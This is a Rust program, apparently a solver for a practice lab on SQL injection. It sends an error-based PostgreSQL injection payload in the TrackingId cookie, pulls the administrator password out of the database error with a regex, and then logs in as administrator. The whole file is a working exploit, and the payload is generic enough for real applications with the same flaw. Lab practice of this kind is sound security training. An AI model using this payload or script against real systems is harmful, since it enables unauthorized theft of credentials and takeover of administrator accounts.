use regex::Regex;
use reqwest::header::COOKIE;
use server_side_sql_injection::{
    HTTP_CLIENT, check_is_lab_solved, generate_clap_parser, login_as_administrator,
};
use std::sync::LazyLock;

static GET_PASSWORD_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"ERROR: invalid input syntax for type integer: "(.+?)""#)
        .expect("[-] Failed to generate TRACKING_ID_REGEX")
});

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    logger::info("Getting the `administrator` password");

    logger::info(format!("Making request to {} with TrackingId=' AND (SELECT password FROM users LIMIT 1)::int=1 --", lab_url).as_ref());

    let response = HTTP_CLIENT
        .get(format!("{}/", lab_url))
        .header(
            COOKIE,
            // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based
            "TrackingId=' AND (SELECT password FROM users LIMIT 1)::int=1 --",
        )
        .send()
        .expect("Failed to send a GET request to /");

    if response.status() == 500 {
        let body = response
            .text()
            .expect("[-] Failed to extract text from response");

        let administrator_password = GET_PASSWORD_REGEX
            .captures(body.as_ref())
            .expect("[-] Failed to get captures from GET_PASSWORD_REGEX")
            .get(1)
            .expect("[-] No captures were found at position 1")
            .as_str();

        login_as_administrator(lab_url, administrator_password.to_string());
    } else {
        panic!(
            "{}",
            logger::error_return("Failed to GET `administrator` password")
        )
    }

    check_is_lab_solved(lab_url);
}
